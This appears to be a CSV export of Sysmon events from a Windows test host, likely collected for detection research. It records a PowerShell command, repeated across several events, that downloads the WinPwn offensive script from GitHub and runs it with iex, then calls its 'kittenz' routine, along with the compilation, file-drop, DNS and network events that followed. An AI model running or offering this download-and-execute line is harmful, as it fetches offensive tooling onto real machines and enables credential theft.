    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Visual C# Command Line Compiler,,,,,,,1,9492,,4.8.9032.0 built by: NET481REL1,"MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.349

ProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ProcessId: 7860

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ParentProcessId: 8840

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}

ParentUser: WINDEV2309EVAL\User",Info,csc.exe,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-41db-658d-8102-000000000b00},8840,WINDEV2309EVAL\User,{fda94052-41de-658d-8402-000000000b00},7044,7860,Microsoft® .NET Framework,,,,,"
      ",-,,,,,,2023-12-28T09:37:34.3505533Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.349,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.3505533Z""/>
      <EventRecordID>9492</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.349</Data>
      <Data Name=""ProcessGuid"">{fda94052-41de-658d-8402-000000000b00}</Data>
      <Data Name=""ProcessId"">7860</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""FileVersion"">4.8.9032.0 built by: NET481REL1</Data>
      <Data Name=""Description"">Visual C# Command Line Compiler</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">csc.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8840</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:34.349

ProcessGuid: {fda94052-41de-658d-8402-000000000b00}

ProcessId: 7860

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ParentProcessId: 8840

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:34.340,,,,,,,,,11,9491,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:34.340

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline

CreationUtcTime: 2023-12-28 09:37:34.340

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41db-658d-8102-000000000b00},7044,8840,,,,,,"
      ",-,,,,,,2023-12-28T09:37:34.3413971Z,C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.340,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.3413971Z""/>
      <EventRecordID>9491</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.340</Data>
      <Data Name=""ProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:34.340</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:34.340

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.cmdline

CreationUtcTime: 2023-12-28 09:37:34.340

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:34.325,,,,,,,,,11,9490,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-28 09:37:34.325

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.dll

CreationUtcTime: 2023-12-28 09:37:34.325

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41db-658d-8102-000000000b00},7044,8840,,,,,,"
      ",DLL,,,,,,2023-12-28T09:37:34.3376774Z,C:\Users\User\AppData\Local\Temp\rhjykccy.dll,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:34.325,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.3376774Z""/>
      <EventRecordID>9490</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:34.325</Data>
      <Data Name=""ProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rhjykccy.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:34.325</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-28 09:37:34.325

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rhjykccy.dll

CreationUtcTime: 2023-12-28 09:37:34.325

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-108-133.github.com,185.199.108.133,false,443,https,,3,9489,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 23:54:39.437

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.164

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 59363

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.108.133

DestinationHostname: cdn-185-199-108-133.github.com

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{fda94052-41db-658d-8102-000000000b00},7044,8840,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.164,false,59363,-,2023-12-28T09:37:34.0371556Z,,,Network connection detected (rule: NetworkConnect),,5204,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:39.437,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:34.0371556Z""/>
      <EventRecordID>9489</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""5204""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:39.437</Data>
      <Data Name=""ProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.164</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">59363</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">185.199.108.133</Data>
      <Data Name=""DestinationHostname"">cdn-185-199-108-133.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 23:54:39.437

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.164

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 59363

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.108.133

DestinationHostname: cdn-185-199-108-133.github.com

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9488,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.430

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41db-658d-8102-000000000b00},7044,8840,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-28T09:37:33.3759905Z,,,Dns query (rule: DnsQuery),,1124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:39.430,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:33.3759905Z""/>
      <EventRecordID>9488</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:39.430</Data>
      <Data Name=""ProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.430

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:31.549,,,,,,,,,11,9487,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:31.549

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_z443p23o.u55.ps1

CreationUtcTime: 2023-12-28 09:37:31.549

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41db-658d-8102-000000000b00},7044,8840,,,,,,"
      ",-,,,,,,2023-12-28T09:37:31.5635657Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_z443p23o.u55.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:31.549,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:31.5635657Z""/>
      <EventRecordID>9487</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:31.549</Data>
      <Data Name=""ProcessGuid"">{fda94052-41db-658d-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_z443p23o.u55.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:31.549</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:31.549

ProcessGuid: {fda94052-41db-658d-8102-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_z443p23o.u55.ps1

CreationUtcTime: 2023-12-28 09:37:31.549

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
